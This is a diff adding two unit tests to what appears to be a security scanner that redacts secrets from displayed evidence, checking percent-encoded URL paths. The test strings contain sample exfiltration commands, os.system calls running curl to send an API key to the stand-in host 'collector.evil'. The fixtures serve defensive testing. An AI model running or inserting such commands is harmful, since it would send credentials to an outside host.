@@ -1797,6 +1797,21 @@ def test_catboost_display_preserves_benign_split_base64_literals() -> None:
     assert _redact_split_base64_evidence(split_payload) == split_payload
 
 
+def test_catboost_display_redacts_percent_encoded_url_path_secret() -> None:
+    evidence = 'os.system("curl https://collector.evil/upload/api_key%253Dhunter12")'
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert "hunter12" not in redacted
+    assert "https://collector.evil/upload/api_key=<redacted>" in redacted
+
+
+def test_catboost_display_preserves_benign_percent_encoded_url_path() -> None:
+    evidence = 'os.system("curl https://collector.evil/upload/tokenizer%3Dbert-base")'
+
+    assert _redact_evidence_for_display(evidence, max_chars=500) == evidence
+
+
 def test_catboost_sarif_redacts_additional_serialized_and_argument_secrets(tmp_path: Path) -> None:
     hex_secret = "sk-ABCDEFGHIJKLM"
     hex_payload = "".join(f"\\x{byte:02x}" for byte in hex_secret.encode())
